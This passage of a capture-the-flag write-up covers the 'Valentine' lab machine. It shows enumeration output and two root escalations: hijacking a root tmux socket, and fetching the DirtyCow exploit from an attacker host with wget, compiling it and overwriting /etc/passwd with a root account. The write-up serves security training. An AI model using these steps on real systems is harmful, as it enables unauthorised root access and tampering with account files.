hype       4976  0.1  0.8  31644  8756 pts/0    Ss   09:50   0:00 -bash
hype       5094  0.0  0.1  17112  1992 pts/0    S+   09:53   0:00 bash
hype       5095  0.0  0.1  17148  1592 pts/0    S+   09:53   0:00 bash
hype       5096  0.0  0.0  11356   660 pts/0    S+   09:53   0:00 tee -a
hype       5300  0.0  0.1  17148  1280 pts/0    S+   09:54   0:00 bash
hype       5301  0.0  0.1  22352  1276 pts/0    R+   09:54   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
 32K -rwxr-xr-x 1 root root  32K Mar 29  2012 /sbin/getty
160K -rwxr-xr-x 1 root root 160K Apr 16  2012 /sbin/init
136K -rwxr-xr-x 1 root root 135K Apr  5  2012 /sbin/udevd
416K -rwxr-xr-x 1 root root 413K Feb 13  2012 /usr/bin/tmux
 44K -rwxr-xr-x 1 root root  44K Dec  2  2015 /usr/bin/vmtoolsd
 16K -rwxr-xr-x 1 root root  15K Jan  6  2012 /usr/lib/policykit-1/polkitd
784K -rwxr-xr-x 4 root root 783K Dec 11  2017 //usr/lib/vmware-caf/pme/bin/ManagementAgentHost
   0 lrwxrwxrwx 1 root root   37 Dec 11  2017 /usr/lib/vmware-vgauth/VGAuthService -> /usr/lib/vmware-tools/bin64/appLoader
   0 lrwxrwxrwx 1 root root   34 Jul 15  2016 /usr/sbin/apache2 -> ../lib/apache2/mpm-prefork/apache2
856K -rwxr-xr-x 1 root root 856K Mar 21  2012 /usr/sbin/bluetoothd
144K -rwxr-xr-x 1 root root 141K Feb 25  2012 /usr/sbin/console-kit-daemon
436K -rwxr-xr-x 1 root root 434K Apr  9  2012 /usr/sbin/cupsd
388K -rwxr-xr-x 1 root root 388K Mar 24  2012 /usr/sbin/modem-manager
508K -rwxr-xr-x 1 root root 505K Aug 11  2016 /usr/sbin/sshd


[-] /etc/init.d/ binary permissions:
total 196
drwxr-xr-x   2 root root  4096 Feb 16  2018 .
drwxr-xr-x 132 root root 12288 Nov  4 00:34 ..
lrwxrwxrwx   1 root root    21 Dec 11  2017 acpid -> /lib/init/upstart-job
-rwxr-xr-x   1 root root   652 Jan  4  2010 acpi-support
lrwxrwxrwx   1 root root    21 Dec 11  2017 alsa-restore -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 alsa-store -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 anacron -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  7621 Feb  6  2012 apache2
-rwxr-xr-x   1 root root  4596 Apr 12  2012 apparmor
lrwxrwxrwx   1 root root    21 Dec 11  2017 apport -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 atd -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 avahi-daemon -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 bluetooth -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  2444 Apr 14  2012 bootlogd
-rwxr-xr-x   1 root root  2125 Mar  1  2011 brltty
lrwxrwxrwx   1 root root    21 Dec 11  2017 console-setup -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 cron -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 cups -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 dbus -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 dmesg -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  1242 Dec 13  2011 dns-clean
lrwxrwxrwx   1 root root    21 Dec 11  2017 failsafe-x -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 friendly-recovery -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  1105 Apr 17  2012 grub-common
-rwxr-xr-x   1 root root  1329 Apr 14  2012 halt
lrwxrwxrwx   1 root root    21 Dec 11  2017 hostname -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 hwclock -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 hwclock-save -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 irqbalance -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  1893 Apr 18  2012 kerneloops
-rwxr-xr-x   1 root root  1293 Apr 14  2012 killprocs
-rw-r--r--   1 root root     0 Apr 25  2012 .legacy-bootordering
lrwxrwxrwx   1 root root    21 Dec 11  2017 lightdm -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 modemmanager -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 module-init-tools -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  2797 Feb 13  2012 networking
lrwxrwxrwx   1 root root    21 Dec 11  2017 network-interface -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 network-interface-container -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 network-interface-security -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 network-manager -> /lib/init/upstart-job
-rwxr-xr-x   1 root root   882 Apr 14  2012 ondemand
-rwxr-xr-x   1 root root  1685 Jan 24  2012 open-vm-tools
lrwxrwxrwx   1 root root    21 Dec 11  2017 plymouth -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 plymouth-log -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 plymouth-splash -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 plymouth-stop -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 plymouth-upstart-bridge -> /lib/init/upstart-job
-rwxr-xr-x   1 root root   561 Feb  4  2011 pppd-dns
lrwxrwxrwx   1 root root    21 Dec 11  2017 procps -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  2180 Apr 11  2012 pulseaudio
-rwxr-xr-x   1 root root  8635 Apr 14  2012 rc
-rwxr-xr-x   1 root root   801 Apr 14  2012 rc.local
-rwxr-xr-x   1 root root   117 Apr 14  2012 rcS
-rw-r--r--   1 root root  2427 Apr 14  2012 README
-rwxr-xr-x   1 root root   639 Apr 14  2012 reboot
lrwxrwxrwx   1 root root    21 Dec 11  2017 resolvconf -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 rfkill-restore -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 rfkill-store -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  4395 Nov  8  2011 rsync
lrwxrwxrwx   1 root root    21 Dec 11  2017 rsyslog -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  2344 Dec  4  2011 saned
-rwxr-xr-x   1 root root  4321 Apr 14  2012 sendsigs
lrwxrwxrwx   1 root root    21 Dec 11  2017 setvtrgb -> /lib/init/upstart-job
-rwxr-xr-x   1 root root   590 Apr 14  2012 single
-rw-r--r--   1 root root  4304 Apr 14  2012 skeleton
-rwxr-xr-x   1 root root  2107 May 15  2011 speech-dispatcher
-rwxr-xr-x   1 root root  4371 Aug 11  2016 ssh
-rwxr-xr-x   1 root root   567 Apr 14  2012 stop-bootlogd
-rwxr-xr-x   1 root root  1143 Apr 14  2012 stop-bootlogd-single
-rwxr-xr-x   1 root root   700 Oct 26  2011 sudo
srw-rw----   1 root root     0 Dec 13  2017 test
-rwxr-xr-x   1 root root   409 Dec 13  2017 tmuxer
lrwxrwxrwx   1 root root    21 Dec 11  2017 udev -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 udev-fallback-graphics -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 udev-finish -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 udevmonitor -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 udevtrigger -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Dec 11  2017 ufw -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  2800 Apr 14  2012 umountfs
-rwxr-xr-x   1 root root  2211 Apr 14  2012 umountnfs.sh
-rwxr-xr-x   1 root root  2926 Apr 14  2012 umountroot
-rwxr-xr-x   1 root root  1039 Nov  9  2011 unattended-upgrades
-rwxr-xr-x   1 root root  1985 Apr 14  2012 urandom
lrwxrwxrwx   1 root root    21 Dec 11  2017 whoopsie -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  2666 Mar 22  2012 x11-common


[-] /etc/init/ config file permissions:
total 332
drwxr-xr-x   2 root root  4096 Dec 11  2017 .
drwxr-xr-x 132 root root 12288 Nov  4 00:34 ..
-rw-r--r--   1 root root   320 Dec  8  2011 acpid.conf
-rw-r--r--   1 root root   268 Apr  3  2012 alsa-restore.conf
-rw-r--r--   1 root root   267 Apr  3  2012 alsa-store.conf
-rw-r--r--   1 root root   278 Jun 20  2010 anacron.conf
-rw-r--r--   1 root root  1309 Apr 18  2012 apport.conf
-rw-r--r--   1 root root   261 Oct 25  2011 atd.conf
-rw-r--r--   1 root root   541 Oct 17  2011 avahi-daemon.conf
-rw-r--r--   1 root root  1009 Mar  7  2012 bluetooth.conf
-rw-r--r--   1 root root   266 Apr 16  2012 console.conf
-rw-r--r--   1 root root   509 Dec 21  2010 console-setup.conf
-rw-r--r--   1 root root  1122 Apr 16  2012 container-detect.conf
-rw-r--r--   1 root root   356 Apr 16  2012 control-alt-delete.conf
-rw-r--r--   1 root root   297 Apr  2  2012 cron.conf
-rw-r--r--   1 root root  1814 Apr  9  2012 cups.conf
-rw-r--r--   1 root root   510 Jan 10  2012 dbus.conf
-rw-r--r--   1 root root   273 Mar 30  2012 dmesg.conf
-rw-r--r--   1 root root  1377 Apr 16  2012 failsafe.conf
-rw-r--r--   1 root root   380 Aug 30  2011 failsafe-x.conf
-rw-r--r--   1 root root   267 Apr 16  2012 flush-early-job-log.conf
-rw-r--r--   1 root root  1247 Mar 14  2012 friendly-recovery.conf
-rw-r--r--   1 root root   317 May 26  2011 hostname.conf
-rw-r--r--   1 root root   557 Mar 29  2012 hwclock.conf
-rw-r--r--   1 root root   444 Mar 29  2012 hwclock-save.conf
-rw-r--r--   1 root root   131 Apr  6  2012 hybrid-gfx.conf
-rw-r--r--   1 root root   571 Feb  3  2012 irqbalance.conf
-rw-r--r--   1 root root  1413 Apr 19  2012 lightdm.conf
-rw-r--r--   1 root root   349 Mar 24  2012 modemmanager.conf
-rw-r--r--   1 root root   367 Mar 18  2011 module-init-tools.conf
-rw-r--r--   1 root root   943 Apr 12  2012 mountall.conf
-rw-r--r--   1 root root   349 Apr 12  2012 mountall-net.conf
-rw-r--r--   1 root root   261 Apr 12  2012 mountall-reboot.conf
-rw-r--r--   1 root root  1201 Apr 12  2012 mountall-shell.conf
-rw-r--r--   1 root root   405 Apr 12  2012 mounted-debugfs.conf
-rw-r--r--   1 root root   550 Apr 12  2012 mounted-dev.conf
-rw-r--r--   1 root root   480 Apr 12  2012 mounted-proc.conf
-rw-r--r--   1 root root   610 Apr 12  2012 mounted-run.conf
-rw-r--r--   1 root root  1890 Apr 12  2012 mounted-tmp.conf
-rw-r--r--   1 root root   903 Apr 12  2012 mounted-var.conf
-rw-r--r--   1 root root   388 Apr  4  2012 networking.conf
-rw-r--r--   1 root root   803 Apr  4  2012 network-interface.conf
-rw-r--r--   1 root root   523 Apr  4  2012 network-interface-container.conf
-rw-r--r--   1 root root  1603 Apr  4  2012 network-interface-security.conf
-rw-r--r--   1 root root   543 Apr 12  2012 network-manager.conf
-rw-r--r--   1 root root   971 Nov  9  2011 plymouth.conf
-rw-r--r--   1 root root   326 Mar 26  2010 plymouth-log.conf
-rw-r--r--   1 root root   899 Mar 18  2011 plymouth-splash.conf
-rw-r--r--   1 root root   800 Apr 13  2012 plymouth-stop.conf
-rw-r--r--   1 root root   367 Jan 25  2011 plymouth-upstart-bridge.conf
-rw-r--r--   1 root root   363 Dec  5  2011 procps.conf
-rw-r--r--   1 root root   454 Apr 16  2012 rc.conf
-rw-r--r--   1 root root   705 Apr 16  2012 rcS.conf
-rw-r--r--   1 root root  1543 Apr 16  2012 rc-sysinit.conf
-rw-r--r--   1 root root   457 Mar 29  2012 resolvconf.conf
-rw-r--r--   1 root root   597 Mar 22  2012 rfkill-restore.conf
-rw-r--r--   1 root root   469 Mar 22  2012 rfkill-store.conf
-rw-r--r--   1 root root   426 Mar 30  2012 rsyslog.conf
-rw-r--r--   1 root root   230 Mar 18  2011 setvtrgb.conf
-rw-r--r--   1 root root   277 Apr 16  2012 shutdown.conf
-rw-r--r--   1 root root   667 Mar 26  2013 ssh.conf
-rw-r--r--   1 root root   348 Apr 16  2012 tty1.conf
-rw-r--r--   1 root root   333 Apr 16  2012 tty2.conf
-rw-r--r--   1 root root   333 Apr 16  2012 tty3.conf
-rw-r--r--   1 root root   333 Apr 16  2012 tty4.conf
-rw-r--r--   1 root root   232 Apr 16  2012 tty5.conf
-rw-r--r--   1 root root   232 Apr 16  2012 tty6.conf
-rw-r--r--   1 root root   322 Dec 16  2011 udev.conf
-rw-r--r--   1 root root   637 Apr  4  2012 udev-fallback-graphics.conf
-rw-r--r--   1 root root   769 Aug 22  2011 udev-finish.conf
-rw-r--r--   1 root root   356 Sep 29  2011 udevmonitor.conf
-rw-r--r--   1 root root   352 Apr  4  2012 udevtrigger.conf
-rw-r--r--   1 root root   473 Apr  5  2012 ufw.conf
-rw-r--r--   1 root root   329 Apr 16  2012 upstart-socket-bridge.conf
-rw-r--r--   1 root root   553 Apr 16  2012 upstart-udev-bridge.conf
-rw-r--r--   1 root root   889 Feb  3  2012 ureadahead.conf
-rw-r--r--   1 root root   683 Feb  3  2012 ureadahead-other.conf
-r--r--r--   1 root root   901 Dec 11  2017 vmware-tools.conf
-rw-r--r--   1 root root   351 Dec 11  2017 vmware-tools-thinprint.conf
-rw-r--r--   1 root root  1481 Apr 16  2012 wait-for-state.conf
-rw-r--r--   1 root root   362 Apr 18  2012 whoopsie.conf


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 4.0K
drwxr-xr-x 9 root root 4.0K Apr 25  2012 system

/lib/systemd/system:
total 112K
drwxr-xr-x 2 root root 4.0K Apr 25  2012 basic.target.wants
drwxr-xr-x 2 root root 4.0K Apr 25  2012 halt.target.wants
drwxr-xr-x 2 root root 4.0K Apr 25  2012 poweroff.target.wants
drwxr-xr-x 2 root root 4.0K Apr 25  2012 reboot.target.wants
drwxr-xr-x 2 root root 4.0K Apr 25  2012 dbus.target.wants
drwxr-xr-x 2 root root 4.0K Apr 25  2012 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Apr 25  2012 sockets.target.wants
-rw-r--r-- 1 root root  133 Apr 13  2012 upower.service
-rw-r--r-- 1 root root  137 Apr 12  2012 udisks.service
-rw-r--r-- 1 root root  164 Apr  5  2012 udev-control.socket
-rw-r--r-- 1 root root  177 Apr  5  2012 udev-kernel.socket
-rw-r--r-- 1 root root  341 Apr  5  2012 udev.service
-rw-r--r-- 1 root root  752 Apr  5  2012 udev-settle.service
-rw-r--r-- 1 root root  291 Apr  5  2012 udev-trigger.service
-rw-r--r-- 1 root root  231 Mar 30  2012 rsyslog.service
-rw-r--r-- 1 root root  433 Mar 27  2012 accounts-daemon.service
-rw-r--r-- 1 root root  189 Mar 21  2012 bluetooth.service
-rw-r--r-- 1 root root  432 Feb 25  2012 console-kit-daemon.service
-rw-r--r-- 1 root root  219 Feb 25  2012 console-kit-log-system-restart.service
-rw-r--r-- 1 root root  201 Feb 25  2012 console-kit-log-system-start.service
-rw-r--r-- 1 root root  218 Feb 25  2012 console-kit-log-system-stop.service
-rw-r--r-- 1 root root  419 Feb 22  2012 dbus.service
-rw-r--r-- 1 root root  106 Feb 22  2012 dbus.socket
-rw-r--r-- 1 root root  471 Feb 13  2012 colord.service
-rw-r--r-- 1 root root 1.1K Dec 17  2011 avahi-daemon.service
-rw-r--r-- 1 root root  874 Dec 17  2011 avahi-daemon.socket
-rw-r--r-- 1 root root  188 Nov  8  2011 rsync.service
-rw-r--r-- 1 root root  953 Oct 24  2011 rtkit-daemon.service

/lib/systemd/system/basic.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Dec 11  2017 console-kit-log-system-start.service -> ../console-kit-log-system-start.service
lrwxrwxrwx 1 root root 15 Dec 11  2017 udev.service -> ../udev.service
lrwxrwxrwx 1 root root 23 Dec 11  2017 udev-trigger.service -> ../udev-trigger.service

/lib/systemd/system/halt.target.wants:
total 0
lrwxrwxrwx 1 root root 38 Dec 11  2017 console-kit-log-system-stop.service -> ../console-kit-log-system-stop.service

/lib/systemd/system/poweroff.target.wants:
total 0
lrwxrwxrwx 1 root root 38 Dec 11  2017 console-kit-log-system-stop.service -> ../console-kit-log-system-stop.service

/lib/systemd/system/reboot.target.wants:
total 0
lrwxrwxrwx 1 root root 41 Dec 11  2017 console-kit-log-system-restart.service -> ../console-kit-log-system-restart.service

/lib/systemd/system/dbus.target.wants:
total 0
lrwxrwxrwx 1 root root 14 Dec 11  2017 dbus.socket -> ../dbus.socket

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Dec 11  2017 dbus.service -> ../dbus.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 14 Dec 11  2017 dbus.socket -> ../dbus.socket
lrwxrwxrwx 1 root root 22 Dec 11  2017 udev-control.socket -> ../udev-control.socket
lrwxrwxrwx 1 root root 21 Dec 11  2017 udev-kernel.socket -> ../udev-kernel.socket


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.3p1


[-] Apache version:
Server version: Apache/2.2.22 (Ubuntu)
Server built:   Jul 15 2016 15:32:34


[-] Apache user configuration:
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data


[-] Installed Apache modules:
Loaded Modules:
 core_module (static)
 log_config_module (static)
 logio_module (static)
 mpm_prefork_module (static)
 http_module (static)
 so_module (static)
 alias_module (shared)
 auth_basic_module (shared)
 authn_file_module (shared)
 authz_default_module (shared)
 authz_groupfile_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 cgi_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 mime_module (shared)
 negotiation_module (shared)
 php5_module (shared)
 reqtimeout_module (shared)
 setenvif_module (shared)
 ssl_module (shared)
 status_module (shared)


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc
/usr/bin/curl


[-] Installed compilers:
ii  gcc                                    4:4.6.3-1ubuntu5                        GNU C compiler
ii  gcc-4.6                                4.6.3-1ubuntu5                          GNU C compiler
ii  libprotoc7                             2.4.1-1ubuntu2                          protocol buffers compiler library
ii  protobuf-compiler                      2.4.1-1ubuntu2                          compiler for protocol buffer definition files


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1711 Dec 11  2017 /etc/passwd
-rw-r--r-- 1 root root 850 Feb  6  2018 /etc/group
-rw-r--r-- 1 root root 665 Apr 25  2012 /etc/profile
-rw-r----- 1 root shadow 1164 Feb  6  2018 /etc/shadow


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 91 Dec 11  2017 /etc/kernel-img.conf
-rw-r--r-- 1 root root 321 Mar 29  2012 /etc/blkid.conf
-rw-r--r-- 1 root root 6961 Apr 25  2012 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 15752 Jul 25  2009 /etc/ltrace.conf
-rw-r--r-- 1 root root 333 Dec 11  2017 /etc/updatedb.conf
-rw-r--r-- 1 root root 34 Apr 25  2012 /etc/ld.so.conf
-rw-r--r-- 1 root root 1260 May  2  2011 /etc/ucf.conf
-rw-r--r-- 1 root root 624 May 16  2010 /etc/mtools.conf
-rw-r--r-- 1 root root 956 Mar 30  2012 /etc/mke2fs.conf
-rw-r--r-- 1 root root 112 Jun 22  2007 /etc/apg.conf
-rw-r--r-- 1 root root 10333 Feb 21  2012 /etc/sensors3.conf
-rw-r--r-- 1 root root 1309 Apr 18  2012 /etc/kerneloops.conf
-rw-r--r-- 1 root root 7649 Apr 25  2012 /etc/pnm2ppa.conf
-rw-r--r-- 1 root root 2064 Nov 23  2006 /etc/netscsid.conf
-rw-r----- 1 root fuse 216 Oct 18  2011 /etc/fuse.conf
-rw-r--r-- 1 root root 2083 Dec  5  2011 /etc/sysctl.conf
-rw-r--r-- 1 root root 2969 Mar 15  2012 /etc/debconf.conf
-rw-r--r-- 1 root root 350 Dec 11  2017 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 4728 Mar 24  2012 /etc/hdparm.conf
-rw-r--r-- 1 root root 599 Oct  4  2011 /etc/logrotate.conf
-rw-r--r-- 1 root root 19925 Apr 10  2012 /etc/brltty.conf
-rw-r--r-- 1 root root 1343 Jan  9  2007 /etc/wodim.conf
-rw-r--r-- 1 root root 699 Feb 13  2012 /etc/colord.conf
-rw-r--r-- 1 root root 513 Apr 25  2012 /etc/nsswitch.conf
-rw-r--r-- 1 root root 1309 Nov  4 00:34 /etc/tpvmlp.conf
-rw-r--r-- 1 root root 1263 Mar 30  2012 /etc/rsyslog.conf
-rw-r--r-- 1 root root 2981 Apr 25  2012 /etc/adduser.conf
-rw-r--r-- 1 root root 572 Mar  7  2012 /etc/usb_modeswitch.conf
-rw-r--r-- 1 root root 3343 Apr 19  2012 /etc/gai.conf
-rw-r--r-- 1 root root 92 Apr 19  2012 /etc/host.conf
-rw-r--r-- 1 root root 552 Feb  8  2012 /etc/pam.conf
-rw-r--r-- 1 root root 839 Apr  9  2012 /etc/insserv.conf
-rw-r--r-- 1 root root 604 Oct 19  2011 /etc/deluser.conf


[-] Current user's history files:
-rw------- 1 hype hype 335 Nov  4 04:52 /home/hype/.bash_history


[-] Location and contents (if accessible) of .bash_history file(s):
/home/hype/.bash_history

exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess
tmux a -t dev_sess
tmux --help
tmux -S /.devs/dev_sess
exit
id
ls -al
sudo -l
ls
cd Desktop/
ls
cat user.txt
cd ..
whoami
uname -a
ps aux
​ tmux -S /.devs/dev_sess
​tmux -S /.devs/dev_sess
tmux -h
​tmux -S /.devs/dev_sess
tmux -S /.devs/dev_sess


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Apr 25  2012 .
drwxr-xr-x 14 root root 4096 Feb  6  2018 ..


### SCAN COMPLETE ####################################
hype@Valentine:~/Desktop$
```

###### Gaining root

```sh
hype@Valentine:~$ ps -ef | grep root | grep tmux
root       1055      1  0 00:35 ?        00:00:11 /usr/bin/tmux -S /.devs/dev_sess
hype@Valentine:~$
```

```sh
hype@Valentine:~$ cat .bash_history | grep tmux
tmux -L dev_sess
tmux a -t dev_sess
tmux --help
tmux -S /.devs/dev_sess
​ tmux -S /.devs/dev_sess
​tmux -S /.devs/dev_sess
tmux -h
​tmux -S /.devs/dev_sess
tmux -S /.devs/dev_sess
hype@Valentine:~$
```

```sh
hype@Valentine:~$ ls -lah /.devs/dev_sess
srw-rw---- 1 root hype 0 Nov  4 00:35 /.devs/dev_sess
hype@Valentine:~$
```

```sh
hype@Valentine:~$ groups
hype cdrom dip plugdev sambashare
hype@Valentine:~$
```

```sh
hype@Valentine:~$ /usr/bin/tmux -S /.devs/dev_sess
```

```sh
root@Valentine:/home/hype# id
uid=0(root) gid=0(root) groups=0(root)
root@Valentine:/home/hype# cd /root/
root@Valentine:~# ls -l
total 8
-rwxr-xr-x 1 root root 388 Dec 13  2017 curl.sh
-rw-r--r-- 1 root root  33 Dec 13  2017 root.txt
root@Valentine:~# cat root.txt
f1bb6d759df1f272914ebbc9ed7765b2
root@Valentine:~#
```

![](images/11.png)

###### DirtyCow

- [`dirtycow.ninja`](https://dirtycow.ninja/)

![](images/12.png)

- [`https://github.com/FireFart/dirtycow/blob/master/dirty.c`](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

![](images/13.png)

![](images/14.png)

```sh
root@kali:~/valentine# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.79 - - [04/Nov/2018 12:54:50] "GET /LinEnum.sh HTTP/1.1" 200 -
10.10.10.79 - - [04/Nov/2018 13:10:22] "GET /dirty.c HTTP/1.1" 200 -
```

```sh
hype@Valentine:~$ gcc -v
Using built-in specs.
COLLECT_GCC=gcc
COLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-linux-gnu/4.6/lto-wrapper
Target: x86_64-linux-gnu
Configured with: ../src/configure -v --with-pkgversion='Ubuntu/Linaro 4.6.3-1ubuntu5' --with-bugurl=file:///usr/share/doc/gcc-4.6/README.Bugs --enable-languages=c,c++,fortran,objc,obj-c++ --prefix=/usr --program-suffix=-4.6 --enable-shared --enable-linker-build-id --with-system-zlib --libexecdir=/usr/lib --without-included-gettext --enable-threads=posix --with-gxx-include-dir=/usr/include/c++/4.6 --libdir=/usr/lib --enable-nls --with-sysroot=/ --enable-clocale=gnu --enable-libstdcxx-debug --enable-libstdcxx-time=yes --enable-gnu-unique-object --enable-plugin --enable-objc-gc --disable-werror --with-arch-32=i686 --with-tune=generic --enable-checking=release --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnu
Thread model: posix
gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5)
hype@Valentine:~$
```

```sh
hype@Valentine:~$ wget http://10.10.14.6/dirty.c
--2018-11-04 10:09:22--  http://10.10.14.6/dirty.c
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4816 (4.7K) [text/plain]
Saving to: `dirty.c'

100%[==================================================================================================================================================================>] 4,816       --.-K/s   in 0s

2018-11-04 10:09:22 (186 MB/s) - `dirty.c' saved [4816/4816]

hype@Valentine:~$
hype@Valentine:~$ ls
Desktop  dirty.c  Documents  Downloads  Music  Pictures  Public  Templates  Videos
hype@Valentine:~$
hype@Valentine:~$
```

```sh
hype@Valentine:~$ gcc -pthread dirty.c -o dirty -lcrypt
hype@Valentine:~$ ls -l dirty*
-rwxrwxr-x 1 hype hype 14116 Nov  4 10:10 dirty
-rw-rw-r-- 1 hype hype  4816 Nov  4 10:09 dirty.c
hype@Valentine:~$
hype@Valentine:~$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:figsoZwws4Zu6:0:0:pwned:/root:/bin/bash

mmap: 7fc56f49e000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password ''.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password ''.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
hype@Valentine:~$
```

```sh
hype@Valentine:~$ su - firefart
Password:
firefart@Valentine:~#
firefart@Valentine:~# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@Valentine:~#
```

```sh
firefart@Valentine:~# cd /root
firefart@Valentine:~# ls
curl.sh  root.txt
firefart@Valentine:~# cat root.txt
f1bb6d759df1f272914ebbc9ed7765b2
firefart@Valentine:~#
```